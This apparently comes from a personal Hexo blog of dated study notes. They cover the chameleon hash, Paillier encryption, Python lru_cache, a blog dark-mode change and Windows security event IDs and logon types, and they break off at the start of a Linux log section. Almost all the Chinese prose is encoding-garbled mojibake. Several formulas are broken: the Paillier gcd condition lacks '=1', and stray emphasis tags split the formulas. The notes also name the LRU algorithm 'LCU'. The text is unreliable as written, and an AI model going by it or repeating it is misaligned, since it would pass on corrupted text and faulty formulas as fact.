<p>å®é™…åº”ç”¨ä¸­ï¼Œæœ‰ RC4 ç­‰æµå¯†ç æ–¹æ¡ˆã€‚RC4 ä¸å¤ªå®‰å…¨ï¼ŒLFSR éå¸¸ä¸å®‰å…¨ã€‚ç›®å‰æ¥çœ‹ï¼Œä¸»å¼ é‡‡ç”¨åˆ†ç»„å¯†ç æ¥è¿›è¡ŒåŠ å¯†ï¼›å¦‚æœä¸€å®šè¦ç”¨æµå¯†ç ï¼Œä¸€èˆ¬ç”¨åˆ†ç»„å¯†ç é€ ä¸€ä¸ªæµå‡ºæ¥ã€‚</p>
<h2 id="Latexå­—æ¯æ˜¾ç¤º"><a href="#Latexå­—æ¯æ˜¾ç¤º" class="headerlink" title="Latexå­—æ¯æ˜¾ç¤º"></a>Latexå­—æ¯æ˜¾ç¤º</h2><ul>
<li>å¸Œè…Šå­—æ¯$\Alpha$</li>
<li>é»‘æ¿ç²—ä½“$\mathbb{A}$</li>
<li>æ­£ç²—ä½“$\mathbf{A}$</li>
<li>æ–œä½“æ•°å­—$\mathit{0123456789}$</li>
<li>ç½—é©¬ä½“$\mathrm{A}$</li>
<li>å“¥ç‰¹ä½“$\mathfrak{A}$</li>
<li>æ‰‹å†™ä½“$\mathcal{A}$</li>
<li>å¸Œä¼¯æ¥å­—æ¯$\aleph \beth \gimel \daleth$</li>
</ul>
<h1 id="230313"><a href="#230313" class="headerlink" title="230313"></a>230313</h1><h2 id="å‡†å¤‡æ­å»ºæ¡†æ¶"><a href="#å‡†å¤‡æ­å»ºæ¡†æ¶" class="headerlink" title="å‡†å¤‡æ­å»ºæ¡†æ¶"></a>å‡†å¤‡æ­å»ºæ¡†æ¶</h2><blockquote>
<p><a href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</a></p>
</blockquote>
<p>æ„Ÿè§‰å‰ç½®ä»‹ç»è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œçº§åˆ«ï¼šä½çº§</p>
<p>ä¸»ä½“ä»‹ç»ï¼šå‘å±•è¶‹åŠ¿ï¼Œæ¨å¹¿åº”ç”¨</p>
<ul>
<li>å‘å±•è¶‹åŠ¿ï¼šåé‡å­å¯†ç ï¼Œå¯†ç å­¦å‘å±•å†ç¨‹</li>
<li>æ¨å¹¿åº”ç”¨ï¼šå®‰å…¨åè®®ï¼ŒåŒºå—é“¾ï¼Œå®‰å…¨å¤šæ–¹è®¡ç®—</li>
<li>å‘å±•è¶‹åŠ¿<ul>
<li>å»ä¿¡ä»»åŒ–</li>
<li>éšç§æ•°æ®å¤„ç†&#x2F;æ¨¡ç³Š</li>
<li>åé‡å­å¯†ç </li>
</ul>
</li>
</ul>
<h2 id="ç»å…¸Chameleon-Hashæ„é€ "><a href="#ç»å…¸Chameleon-Hashæ„é€ " class="headerlink" title="ç»å…¸Chameleon Hashæ„é€ "></a>ç»å…¸Chameleon Hashæ„é€ </h2><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç»å…¸çš„Chameleon Hashæ„é€ ã€‚è¿™ä¸ªæ„é€ æ˜¯2000å¹´æå‡ºçš„ï¼Œæœ€ä¸ºç›´è§‚å’Œç»å…¸çš„Chameleon Hashæ„é€ ã€‚æœ‰å…´è¶£çš„æœ‹å‹ä»¬å¯ä»¥å‚çœ‹ä¸‹é¢çš„è®ºæ–‡ã€‚</p>
<blockquote>
<p>Krawczyk H, Rabin T. Chameleon hashing and signatures. NDSS 2000: 143-154.</p>
</blockquote>
<ul>
<li>(sk, pk) &#x3D; KeyGen($\lambda$)ã€‚é¦–å…ˆï¼Œæ„é€ ä¸€ä¸ªæ»¡è¶³å®‰å…¨å¸¸æ•°çš„å¾ªç¯ç¾¤Gï¼ˆæ¯”å¦‚mod pç¾¤å°±å¯ä»¥ï¼‰ã€‚é€‰æ‹©ä¸€ä¸ªGç¾¤çš„ç”Ÿæˆå…ƒgï¼Œé€‰æ‹©ä¸€ä¸ªéšæœºçš„æŒ‡æ•°xï¼Œè®¡ç®—h &#x3D; $g^x$ã€‚é‚£ä¹ˆï¼Œç§é’¥sk &#x3D; xï¼Œå…¬é’¥pk &#x3D; (g, h)ã€‚</li>
<li>Hm &#x3D; Hash(pk, m, r)ã€‚ç»™å®šæ¶ˆæ¯mä»¥åŠä¸€ä¸ªéšæœºçš„æŒ‡æ•°rï¼ŒHashçš„ç»“æœä¸º$Hm &#x3D; g^m h^r$ã€‚</li>
<li>râ€™ &#x3D; UForge(sk, m, r, mâ€™)ã€‚ç®—æ³•ç®€å•åœ°æ ¹æ®ç­‰å¼$m + xr &#x3D; mâ€™ + xrâ€™$æ¥è®¡ç®—$râ€™$ã€‚</li>
</ul>
<p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå› ä¸º$m+xr &#x3D; mâ€™+xrâ€™$æˆç«‹ï¼Œå› æ­¤Hashçš„ç»“æœä¸­æœ‰$g^{m} \cdot h^{r} &#x3D; g^{m} \cdot g^{(xr)} &#x3D; g^{(m + xr)} &#x3D; g^{(mâ€™ + xrâ€™)} &#x3D; g^{mâ€™} \cdot h^{râ€™}$ã€‚ä¼ªé€ æˆç«‹ã€‚</p>
<p>ç„¶è€Œï¼Œå¯¹äºå…¶ä»–äººæ¥è¯´ï¼Œå…¶ä¸çŸ¥é“xçš„å€¼ï¼Œå› æ­¤ï¼Œå¦‚æœæƒ³æ„é€ å‡ºä¸€ä¸ªç¢°æ’ï¼Œå…¶ä»–äººå¿…é¡»åœ¨æŒ‡æ•°ä¸Šé¢è§£æ–¹ç¨‹$g^(m + xr) &#x3D; g^(mâ€™ + xrâ€™)$ï¼Œä¹Ÿå°±æ˜¯è¯´å»æ±‚ä¸€ä¸ªç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚ä½†æ˜¯ï¼Œç¦»æ•£å¯¹æ•°é—®é¢˜ç›´åˆ°ç°åœ¨ä¸ºæ­¢éƒ½æ²¡æœ‰ä¸€ä¸ªå¾ˆå¿«çš„ç®—æ³•ï¼ˆæœ€å¿«ä¹Ÿæ˜¯æŒ‡æ•°çº§çš„ï¼‰ã€‚å› æ­¤å¯¹äºå…¶ä»–äººæ¥è¯´ï¼Œå¾ˆéš¾æ‰¾åˆ°ç¢°æ’ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªç®—æ³•éå¸¸çš„å·§å¦™ã€‚åˆ©ç”¨äº†ç¦»æ•£å¯¹æ•°é—®é¢˜æ±‚è§£å›°éš¾è¿™ä¸ªäº‹å®ï¼Œæ„é€ äº†ä¸€ä¸ªChameleon hashã€‚</p>
<h2 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h2><p>B+æ ‘ï¼ˆIOæ¬¡æ•°æ›´å°‘ï¼›æŸ¥è¯¢æ€§èƒ½ç¨³å®šï¼›èŒƒå›´æŸ¥è¯¢ç®€ä¾¿ï¼‰</p>
<p>B-æ ‘</p>
<h1 id="230314"><a href="#230314" class="headerlink" title="230314"></a>230314</h1><h2 id="paillier-cryptosystem"><a href="#paillier-cryptosystem" class="headerlink" title="paillier cryptosystem"></a>paillier cryptosystem</h2><h3 id="The-first-patternï¼š"><a href="#The-first-patternï¼š" class="headerlink" title="The first patternï¼š"></a>The first patternï¼š</h3><ol>
<li>éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•°$p$ã€$q$æ»¡è¶³$gcd(pq, (p-1)*(q-1))$ã€‚</li>
<li>è®¡ç®—$n&#x3D;p<em>qï¼ŒÎ» &#x3D; lcm(p-1, q-1) &#x3D; (p-1)</em>(q-1) &#x2F; gcd(p-1,q-1)$</li>
<li>é€‰æ‹©éšæœºæ•´æ•°$g$ï¼Œ$0&lt;g&lt;n^2$</li>
<li>å®šä¹‰$L(x) &#x3D; (x-1) &#x2F; n$</li>
<li>è®¡ç®—$Î¼ &#x3D; (L(g^Î» \mod n^2 ))^{-1} \mod n$</li>
<li>å…¬é’¥ä¸º$(nï¼Œg)$</li>
<li>ç§é’¥ä¸º$(Î»ï¼ŒÎ¼)$</li>
</ol>
<h3 id="The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š"><a href="#The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š" class="headerlink" title="The second patternï¼ˆa simpler variantï¼‰ï¼š"></a>The second patternï¼ˆa simpler variantï¼‰ï¼š</h3><p>å…¶ä½™å‚æ•°ä¸å˜ï¼Œä¸»è¦æ”¹å˜äº†$g$ï¼Œ$Î»$ï¼Œ$Î¼$çš„å®šä¹‰</p>
<ol>
<li>éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•°$p$ã€$q$æ»¡è¶³$gcd(pq, (p-1)*(q-1))$ã€‚</li>
<li>è®¡ç®—$n&#x3D;p<em>qï¼ŒÎ» &#x3D; lcm(p-1, q-1) &#x3D; (p-1)</em>(q-1) &#x2F; gcd(p-1,q-1)$</li>
<li>å®šä¹‰$L(x) &#x3D; (x-1) &#x2F; n$</li>
<li>$g &#x3D; n+1$</li>
<li>$Î» &#x3D; Ï†(n) &#x3D; (p-1)*(q-1)$</li>
<li>$Î¼ &#x3D; Ï†(n)^{-1} \mod n$</li>
</ol>
<h3 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h3><ol>
<li>è®¾$m$ä¸ºè¦åŠ å¯†çš„æ¶ˆæ¯ï¼Œæ˜¾ç„¶éœ€è¦æ»¡è¶³ï¼Œ$0 â‰¤ m ï¼œ n$</li>
<li>é€‰æ‹©éšæœº $r$ï¼Œä¿è¯$gcd(r, n) &#x3D; 1$</li>
<li>å¯†æ–‡$c$ï¼š$c &#x3D; (g^m) *(r^n) \mod n^2$</li>
</ol>
<h3 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h3><ol>
<li>$m &#x3D; ( L( c^Î» \mod n^2 ) \times Î¼ ) \mod n$</li>
</ol>
<h1 id="230315"><a href="#230315" class="headerlink" title="230315"></a>230315</h1><ul>
<li><input checked="" disabled="" type="checkbox"> åšæ–‡-paillier-cryptosystema</li>
<li><input checked="" disabled="" type="checkbox"> paillier-cryptosystem1&#x2F;2</li>
</ul>
<p>ç»è¿‡è¯æ˜ä¹‹åï¼Œå‘ç°ä¸Šè¯æ˜éœ€è¦ç”¨åˆ°ä¸€äº›å®šç†ã€‚</p>
<h2 id="paillier1-x2F-2æ¶‰åŠå®šç†"><a href="#paillier1-x2F-2æ¶‰åŠå®šç†" class="headerlink" title="paillier1&#x2F;2æ¶‰åŠå®šç†"></a>paillier1&#x2F;2æ¶‰åŠå®šç†</h2><ul>
<li>è´¹é©¬å°å®šç†</li>
<li>æ¬§æ‹‰å‡½æ•°</li>
</ul>
<h2 id="å¤ç°-not-RSA"><a href="#å¤ç°-not-RSA" class="headerlink" title="å¤ç°-not RSA"></a>å¤ç°-not RSA</h2><ul>
<li>mid</li>
<li>200</li>
<li>paillier-2</li>
</ul>
<h2 id="å¤ç°-paillier"><a href="#å¤ç°-paillier" class="headerlink" title="å¤ç°-paillier"></a>å¤ç°-paillier</h2><ul>
<li>mid</li>
<li>200</li>
<li>paillier-2</li>
</ul>
<h1 id="230316"><a href="#230316" class="headerlink" title="230316"></a>230316</h1><h2 id="lru-cache"><a href="#lru-cache" class="headerlink" title="lru_cache"></a>lru_cache</h2><p>lru_cacheæ˜¯é€šè¿‡è‘—åçš„LCUç®—æ³•æ¥å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç¼“å­˜æ·˜æ±°ç®—æ³•ã€‚</p>
<h2 id="æƒŠå¥‡"><a href="#æƒŠå¥‡" class="headerlink" title="æƒŠå¥‡"></a>æƒŠå¥‡</h2><p>è®¡ç®—å™¨å±…ç„¶æœ‰ç¨‹åºå‘˜ç±»å‹çš„ï¼</p>
<p>amazingï¼</p>
<h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><p>x64ï¼Œå®ç°åˆ†é…æ ˆç©ºé—´ï¼Œç„¶åä»¥åˆ†é…çš„æ ˆç©ºé—´ä¸ºåŸºå‡†è¿›è¡Œæ•°æ®çš„å­˜æ”¾ã€‚</p>
<h1 id="230317"><a href="#230317" class="headerlink" title="230317"></a>230317</h1><h2 id="åˆæˆ˜æ——é¼“ä¹‹æ•´æ´»é»‘ç™½å¤œçš„ç°"><a href="#åˆæˆ˜æ——é¼“ä¹‹æ•´æ´»é»‘ç™½å¤œçš„ç°" class="headerlink" title="åˆæˆ˜æ——é¼“ä¹‹æ•´æ´»é»‘ç™½å¤œçš„ç°"></a>åˆæˆ˜æ——é¼“ä¹‹æ•´æ´»é»‘ç™½å¤œçš„ç°</h2><ul>
<li><code>_config.next.yml</code>æ–°å¢<code>Darkmode JS</code><ul>
<li>ä¿®æ”¹é»˜è®¤æŒ‰é’®</li>
<li><code>pjax</code>é»˜è®¤ä¸º<code>true</code></li>
</ul>
</li>
<li>å®‰è£…æ’ä»¶</li>
</ul>
<p><em><strong>&#x3D; &#x3D;, æ€ä¹ˆçªç„¶åˆå¯ä»¥äº†ï¼Œç¥å¥‡ï¼</strong></em></p>
<ul>
<li>ä½†ä»£ç åˆæœ‰ç‚¹é¢œè‰²æ€ªå¼‚ï¼Œç¨å¾®ä¿®æ”¹ä¸‹ä»£ç é¢œè‰²å§ã€‚</li>
</ul>
<h1 id="230320"><a href="#230320" class="headerlink" title="230320"></a>230320</h1><h2 id="Windowså®‰å…¨æ—¥å¿—"><a href="#Windowså®‰å…¨æ—¥å¿—" class="headerlink" title="Windowså®‰å…¨æ—¥å¿—"></a>Windowså®‰å…¨æ—¥å¿—</h2><h3 id="æŸ¥çœ‹æ­¥éª¤"><a href="#æŸ¥çœ‹æ­¥éª¤" class="headerlink" title="æŸ¥çœ‹æ­¥éª¤"></a>æŸ¥çœ‹æ­¥éª¤</h3><ul>
<li>äº‹ä»¶æŸ¥çœ‹å™¨<ul>
<li>æˆ– <code>eventvwr</code></li>
</ul>
</li>
<li>Windowsæ—¥å¿—<ul>
<li>å®‰å…¨</li>
</ul>
</li>
</ul>
<h3 id="æ–‡ä»¶ä»¥åŠæ ¼å¼"><a href="#æ–‡ä»¶ä»¥åŠæ ¼å¼" class="headerlink" title="æ–‡ä»¶ä»¥åŠæ ¼å¼"></a>æ–‡ä»¶ä»¥åŠæ ¼å¼</h3><ul>
<li><code>.evtx</code> ï¼ˆWin7ä»¥åï¼‰</li>
<li><code>.evt</code> ï¼ˆXPï¼Œserver2003ï¼‰</li>
</ul>
<h3 id="æ—¥å¿—ID"><a href="#æ—¥å¿—ID" class="headerlink" title="æ—¥å¿—ID"></a>æ—¥å¿—ID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç³»ç»Ÿsystemï¼š</span><br><span class="line"></span><br><span class="line">1074ï¼ŒæŸ¥çœ‹è®¡ç®—æœºçš„å¼€æœºã€å…³æœºã€é‡å¯çš„æ—¶é—´ä»¥åŠåŸå› å’Œæ³¨é‡Šã€‚</span><br><span class="line"></span><br><span class="line">6005ï¼Œè¡¨ç¤ºæ—¥å¿—æœåŠ¡å·²å¯åŠ¨ï¼Œç”¨æ¥åˆ¤æ–­æ­£å¸¸å¼€æœºè¿›å…¥ç³»ç»Ÿã€‚</span><br><span class="line"></span><br><span class="line">6006ï¼Œè¡¨ç¤ºæ—¥å¿—æœåŠ¡å·²åœæ­¢ï¼Œç”¨æ¥åˆ¤æ–­ç³»ç»Ÿå…³æœºã€‚</span><br><span class="line"></span><br><span class="line">6009ï¼Œè¡¨ç¤ºéæ­£å¸¸å…³æœºï¼Œ æŒ‰ctrlã€altã€deleteé”®å…³æœºã€‚</span><br><span class="line"></span><br><span class="line">41ï¼Œè¡¨ç¤ºç³»ç»Ÿåœ¨æœªå…ˆæ­£å¸¸å…³æœºçš„æƒ…å†µä¸‹é‡æ–°å¯åŠ¨ã€‚å½“å‡ºç°æ„å¤–æ–­ç”µå…³æœºã€ç³»ç»Ÿå´©æºƒæ—¶ï¼Œå‡ºç°æ­¤äº‹ä»¶IDã€‚</span><br><span class="line"></span><br><span class="line">4199ï¼Œå½“å‘ç”ŸTCP/IPåœ°å€å†²çªçš„æ—¶å€™ï¼Œå‡ºç°æ­¤äº‹ä»¶IDï¼Œç”¨æ¥æ’æŸ¥ç”¨æˆ·IPç½‘ç»œçš„é—®é¢˜ã€‚</span><br><span class="line"></span><br><span class="line">35,36,37ï¼Œè®°å½•æ—¶é—´å®¢æˆ·ç«¯çŠ¶æ€ä¿¡æ¯ï¼Œ35è¡¨ç¤ºæ›´æ”¹æ—¶é—´æºï¼Œ36è¡¨ç¤ºæ—¶é—´åŒæ­¥å¤±è´¥ï¼Œ37è¡¨ç¤ºæ—¶é—´åŒæ­¥æ­£å¸¸</span><br><span class="line"></span><br><span class="line">134ï¼Œå½“å‡ºç°æ—¶é—´åŒæ­¥æºDNSè§£æå¤±è´¥æ—¶ä¼šå‡ºç°æ­¤äº‹ä»¶IDã€‚</span><br><span class="line"></span><br><span class="line">7045ï¼ŒæœåŠ¡åˆ›å»ºæˆåŠŸ</span><br><span class="line"></span><br><span class="line">7030ï¼ŒæœåŠ¡åˆ›å»ºå¤±è´¥</span><br><span class="line"></span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br><span class="line">å®‰å…¨Security</span><br><span class="line"></span><br><span class="line">4624ï¼Œè¡¨ç¤ºæˆåŠŸç™»é™†çš„ç”¨æˆ·ï¼Œç”¨æ¥ç­›é€‰è¯¥ç³»ç»Ÿçš„ç”¨æˆ·ç™»é™†æˆåŠŸæƒ…å†µã€‚</span><br><span class="line"></span><br><span class="line">4625ï¼Œè¡¨ç¤ºç™»é™†å¤±è´¥çš„ç”¨æˆ·ï¼Œç”¨æ¥åˆ¤æ–­RDPçˆ†ç ´çš„æƒ…å†µã€‚</span><br><span class="line"></span><br><span class="line">4672ï¼Œè¡¨ç¤ºæˆäºˆäº†ç‰¹æ®Šæƒé™</span><br><span class="line"></span><br><span class="line">4720,4722,4723,4724,4725,4726,4738,4740ï¼Œäº‹ä»¶IDè¡¨ç¤ºå½“ç”¨æˆ·å¸å·å‘ç”Ÿåˆ›å»ºï¼Œåˆ é™¤ï¼Œæ”¹å˜å¯†ç æ—¶çš„äº‹ä»¶è®°å½•ã€‚</span><br><span class="line"></span><br><span class="line">4727,4737,4739,4762ï¼Œè¡¨ç¤ºå½“ç”¨æˆ·ç»„å‘ç”Ÿæ·»åŠ ã€åˆ é™¤æ—¶æˆ–ç»„å†…æ·»åŠ æˆå‘˜æ—¶ç”Ÿæˆè¯¥äº‹ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="äº‹ä»¶æ—¥å¿—çº§åˆ«"><a href="#äº‹ä»¶æ—¥å¿—çº§åˆ«" class="headerlink" title="äº‹ä»¶æ—¥å¿—çº§åˆ«"></a>äº‹ä»¶æ—¥å¿—çº§åˆ«</h3><ul>
<li>å³ä¾§ç•Œé¢-ç­›é€‰å½“å‰æ—¥å¿—</li>
<li>çº§åˆ«<ul>
<li>å…³é”®</li>
<li>è­¦å‘Š</li>
<li>è¯¦ç»†</li>
<li>é”™è¯¯</li>
<li>ä¿¡æ¯</li>
</ul>
</li>
<li>å…³é”®å­—<ul>
<li>å®¡æ ¸æˆåŠŸ</li>
<li>å®¡æ ¸å¤±è´¥</li>
</ul>
</li>
<li>æ—¥å¿—æ ¼å¼<ul>
<li>å¤´å­—æ®µ<ul>
<li>å®‰å…¨æ—¥å¿—æ¥æºä¸€èˆ¬ä¸çœ‹</li>
</ul>
</li>
<li>æè¿°å­—æ®µ<ul>
<li>å³ï¼Œè¯¦ç»†ä¿¡æ¯ã€‚æ—¥å¿—å†…å®¹æ›´ä¸ºä¸°å¯Œï¼Œåˆ†æé‡ç‚¹ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="æœ¬åœ°å®‰å…¨ç­–ç•¥"><a href="#æœ¬åœ°å®‰å…¨ç­–ç•¥" class="headerlink" title="æœ¬åœ°å®‰å…¨ç­–ç•¥"></a>æœ¬åœ°å®‰å…¨ç­–ç•¥</h3><blockquote>
<p><a href="https://zhidao.baidu.com/question/1456141685192264220.html">å¦‚ä½•æŠŠWin7å®¶åº­æ™®é€šç‰ˆå‡çº§æˆWin7æ——èˆ°ä¸“ä¸šç‰ˆ_ç™¾åº¦çŸ¥é“ (baidu.com)</a></p>
</blockquote>
<ul>
<li><p>å®¶åº­ç‰ˆå¯èƒ½æ²¡æœ‰</p>
</li>
<li><p>å‘½ä»¤è¡ŒæŸ¥çœ‹<code>secpol.msc</code></p>
</li>
<li><p>å®¡æ ¸ç­–ç•¥ç±»åˆ«</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>å®¡æ ¸ç­–ç•¥</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>å®¡æ ¸è´¦æˆ·ç™»å½•äº‹ä»¶</strong></td>
<td>å®¡æ ¸ä»»ä½•ç™»å½•åˆ°å…¶ä»–è®¡ç®—æœºçš„è´¦æˆ·ç™»å½•ä¸æ³¨é”€äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸è´¦æˆ·ç®¡ç†</td>
<td>å®¡æ ¸å¯¹ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºçš„ç®¡ç†äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸ç›®å½•æœåŠ¡è®¿é—®</td>
<td>å®¡æ ¸ADç¯å¢ƒä¸­è®¾ç½®æœ‰ç³»ç»Ÿè®¿é—®æ§åˆ¶åˆ—è¡¨çš„ADå¯¹è±¡ã€‚</td>
</tr>
<tr>
<td><strong>å®¡æ ¸ç™»å½•äº‹ä»¶</strong></td>
<td>å®¡æ ¸ç”¨æˆ·è´¦æˆ·ç™»å½•ä¸æ³¨é”€äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸å¯¹è±¡è®¿é—®</td>
<td>å®¡æ ¸ç”¨æˆ·è´¦æˆ·è®¿é—®å¯¹è±¡çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸ç­–ç•¥æ›´æ”¹</td>
<td>å®¡æ ¸ç”¨æˆ·è´¦æˆ·çš„æƒé™åˆ†é…ç­–ç•¥ã€å®¡æ ¸ç­–ç•¥ä»¥åŠä¿¡ä»»ç­–ç•¥æ›´æ”¹çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸ç‰¹æƒä½¿ç”¨</td>
<td>å®¡æ ¸ç”¨æˆ·æ‰§è¡Œç”±â€œç”¨æˆ·æƒé™åˆ†é…â€ä¸­åˆ¶å®šæƒé™çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸è¿‡ç¨‹è·Ÿè¸ª</td>
<td>å®¡æ ¸ç¨‹åºã€è¿›ç¨‹ã€å¥æŸ„åŠå¯¹è±¡è®¿é—®ç­‰è¯¦ç»†äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>å®¡æ ¸ç³»ç»Ÿäº‹ä»¶</td>
<td>å®¡æ ¸ç”¨æˆ·é‡æ–°å¯åŠ¨æˆ–å…³é—­è®¡ç®—æœºã€æˆ–è€…å¯¹ç³»ç»Ÿå®‰å…¨åŠå®‰å…¨æ—¥å¿—æœ‰å…³çš„äº‹ä»¶ã€‚</td>
</tr>
</tbody></table>
<ul>
<li><p>è´¦æˆ·ç±»å‹</p>
<ul>
<li>åŸŸè´¦æˆ·ï¼šå­˜å‚¨åœ¨ADä¸­</li>
<li>æœ¬åœ°è´¦æˆ·ï¼šå­˜å‚¨åœ¨æœ¬åœ°çš„SAMæ–‡ä»¶ä¸­</li>
</ul>
</li>
<li><p>ç™»å½•äº‹ä»¶è¯¦è§£</p>
<ul>
<li>ç™»å½•ä¼šè¯ç±»å‹ï¼ˆ5ï¼‰</li>
<li>äº‹ä»¶ç±»å‹ï¼ˆ9ï¼‰<ul>
<li>å³é”®-çœ‹äº‹ä»¶å±æ€§</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>ç™»å½•ç±»å‹</th>
<th>ç™»å½•æƒé™</th>
<th>å…¸å‹æƒ…å†µ</th>
</tr>
</thead>
<tbody><tr>
<td>æœ¬åœ°äº¤äº’å¼ï¼šä½¿ç”¨æœ¬åœ°çš„æ§åˆ¶å°ç™»å½•</td>
<td>æœ¬åœ°ç™»å½•</td>
<td>ä½¿ç”¨åŸŸæˆ–è€…æœ¬åœ°è´¦æˆ·ç™»å½•æœ¬åœ°ä¸»æœº</td>
</tr>
<tr>
<td>ç½‘ç»œæ–¹å¼ï¼šä»ç½‘ç»œä¸Šçš„æŸä¸ªä¸»æœºè®¿é—®windowsèµ„æº</td>
<td>ä»ç½‘ç»œè®¿é—®ä¸»æœº</td>
<td>ä¾‹å¦‚è®¿é—®ä¸€å°ä¸»æœºçš„æŸä¸ªå…±äº«æ–‡ä»¶å¤¹</td>
</tr>
<tr>
<td>è¿œç¨‹äº¤æ¢å¼ï¼šé€šè¿‡è¿œç¨‹æ¡Œé¢ã€ç»ˆç«¯æœåŠ¡æˆ–è¿œç¨‹å¸®åŠ©ç™»å½•æŸä¸ªè¿œç¨‹ä¸»æœº</td>
<td>è¿è¡Œé€šè¿‡ç»ˆç«¯æœåŠ¡ç™»å½•</td>
<td>ä½¿ç”¨æœ¬åœ°mstscå®¢æˆ·ç«¯è¿œç¨‹ç™»å½•æŸå°ä¸»æœº</td>
</tr>
<tr>
<td>æ‰¹ä½œä¸šï¼šç”¨äºä½œä¸ºä¸€ä¸ªæŒ‡å®šçš„è´¦æˆ·æ¥è¿è¡Œä¸€ä¸ªè®¡åˆ’ä»»åŠ¡</td>
<td>ä½œä¸ºæ‰¹ä½œä¸šç™»å½•</td>
<td>æŒ‡å®šè®¡åˆ’ä»»åŠ¡æ—¶æŒ‡å®šçš„ä»¥æŸä¸ªå…·ä½“è´¦æˆ·æ¥è¿è¡Œ</td>
</tr>
<tr>
<td>æœåŠ¡æ–¹å¼ï¼šç”¨äºä»¥æŒ‡å®šçš„è´¦æˆ·æ¥è¿è¡ŒæŸä¸ªæœåŠ¡</td>
<td>ä»¥æœåŠ¡æ–¹å¼ç™»å½•</td>
<td>æŒ‡åœ¨æŒ‡å®šæœåŠ¡è¿è¡Œæ—¶ä»¥æœ¬åœ°ç³»ç»Ÿè´¦æˆ·æˆ–è€…æ˜¯å…·ä½“æŸä¸ªè´¦æˆ·è¿è¡Œ</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ç™»å½•ç±»å‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ç™»å½•ç±»å‹2</td>
<td>äº¤äº’å¼ç™»å½•ï¼ˆInteractiveï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹3</td>
<td>ç½‘ç»œï¼ˆNetworkï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹4</td>
<td>æ‰¹å¤„ç†ï¼ˆBatchï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹5</td>
<td>æœåŠ¡ï¼ˆServiceï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹7</td>
<td>è§£é”ï¼ˆUnlockï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹8</td>
<td>ç½‘ç»œæ˜æ–‡ï¼ˆNetworkCleartextï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹9</td>
<td>æ–°å‡­è¯ï¼ˆNewCredentialsï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹10</td>
<td>è¿œç¨‹äº¤äº’ï¼ˆRemoteInteractiveï¼‰</td>
</tr>
<tr>
<td>ç™»å½•ç±»å‹11</td>
<td>ç¼“å­˜äº¤äº’ï¼ˆCachedInteractiveï¼‰</td>
</tr>
</tbody></table>
<ul>
<li>å¤±è´¥äº‹ä»¶<ul>
<li><code>ID4625</code></li>
<li>æŸ¥çœ‹<code>å­ID</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>å­ID</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>0xC000006A</td>
<td>Anincorrect password was supplied</td>
</tr>
<tr>
<td>0xC000006F</td>
<td>Theaccount is not allowed to log on at this time</td>
</tr>
<tr>
<td>0xC0000064</td>
<td>Theaccount does not exist</td>
</tr>
<tr>
<td>0xC0000070</td>
<td>Theaccount is not allowed to log on from this computer</td>
</tr>
<tr>
<td>0xC0000071</td>
<td>Thepassword has expired</td>
</tr>
<tr>
<td>0xC0000072</td>
<td>Theaccount is disabled</td>
</tr>
</tbody></table>
<h2 id="Linuxå®‰å…¨æ—¥å¿—"><a href="#Linuxå®‰å…¨æ—¥å¿—" class="headerlink" title="Linuxå®‰å…¨æ—¥å¿—"></a>Linuxå®‰å…¨æ—¥å¿—</h2><ul>
<li>å¸¸è§æ—¥å¿—åˆ†ç±»</li>
<li>æ—¥å¿—çš„ä¼˜å…ˆçº§</li>
<li><code>message</code>æ—¥å¿—<ul>
